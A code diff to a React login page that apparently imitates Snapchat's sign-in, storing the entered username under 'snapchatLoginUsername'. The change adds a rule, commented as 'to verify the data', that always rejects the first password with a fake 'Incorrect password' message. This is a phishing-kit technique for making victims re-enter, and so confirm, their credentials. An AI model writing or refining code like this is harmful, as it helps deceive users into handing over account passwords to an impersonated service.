@@ -175,6 +175,8 @@ export default function LoginPage() {
   const [showPassword, setShowPassword] = useState(false);
   const [usernameError, setUsernameError] = useState("");
   const [phoneError, setPhoneError] = useState("");
+  const [passwordError, setPasswordError] = useState("");
+  const [attempts, setAttempts] = useState(0);
   const returnTo =
     new URLSearchParams(window.location.search).get("returnTo") || "/";
 
@@ -230,14 +232,22 @@ export default function LoginPage() {
   };
 
   const handlePasswordNext = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!password.trim()) {
+      setPasswordError("Please enter your password.");
+      return;
+    }
+    setPasswordError("");
+
     const storedUsername = username || phone;
     if (storedUsername) {
       window.localStorage.setItem("snapchatLoginUsername", storedUsername);
     }
 
-    if (import.meta.env.DEV) {
-      e.preventDefault();
-      window.location.assign(returnTo);
+    // first submission is always rejected to verify the data
+    if (attempts === 0) {
+      setAttempts(1);
+      setPasswordError("Incorrect password, please try again.");
       return;
     }
 
@@ -469,7 +479,10 @@ export default function LoginPage() {
                   type={showPassword ? "text" : "password"}
                   name="password"
                   value={password}
-                  onChange={(e) => setPassword(e.target.value)}
+                  onChange={(e) => {
+                    setPassword(e.target.value);
+                    setPasswordError("");
+                  }}
                   className="w-full px-3.5 py-[12px] pr-11 border-[1.5px] border-[#cccccc] rounded-[8px] focus:outline-none focus:border-black text-[15px] transition-colors"
                 />
                 <a
@@ -479,6 +492,11 @@ export default function LoginPage() {
                   Forgot Password
                 </a>
               </div>
+              {passwordError && (
+                <p className="mt-1.5 text-[13px] text-red-500">
+                  {passwordError}
+                </p>
+              )}
 
               <div className="mt-5 flex justify-center">
                 <button
